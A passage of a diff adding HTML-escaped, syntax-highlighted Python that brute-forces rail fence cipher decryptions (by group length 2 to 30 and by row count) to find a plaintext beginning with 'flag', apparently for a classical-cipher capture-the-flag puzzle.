+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 还原明文&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rail_pattern&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;rail_fence_by_group_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    按每组字数（分组长度）解密（在线工具常用）
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :param ciphertext: 密文字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :param group_length: 每组的字符数（比如17）
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :return: 明文
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 步骤1：将密文按group_length分组（最后一组不足则补位不影响核心）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;groups&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 步骤2：按列读取每组字符（核心逻辑）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;max_group_len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;groups&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;col&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;max_group_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;col&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;col&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;find_flag_universal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    通用解密函数：同时尝试按行数、按每组字数解密，优先找flag开头结果
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :param ciphertext: 密文字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;待解密密文：&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 1. 尝试按每组字数解密（重点：17，同时遍历2-30）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;【方式1：按每组字数解密（在线工具常用）】&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 优先试17（你提到的关键值）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;res_17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rail_fence_by_group_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res_17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res_17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;✅ 每组17字解密结果：&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res_17&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;🔍 每组17字解密结果：&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res_17&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 遍历2-30组字数，找flag开头&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;🔍 遍历每组字数2-30（找flag开头）：&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gl&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rail_fence_by_group_length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;   每组&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gl&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;字：&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;70&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 2. 尝试按行数（传统栅栏）解密（遍历2-30行）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;match_found&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;【方式2：按传统栅栏行数解密】&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
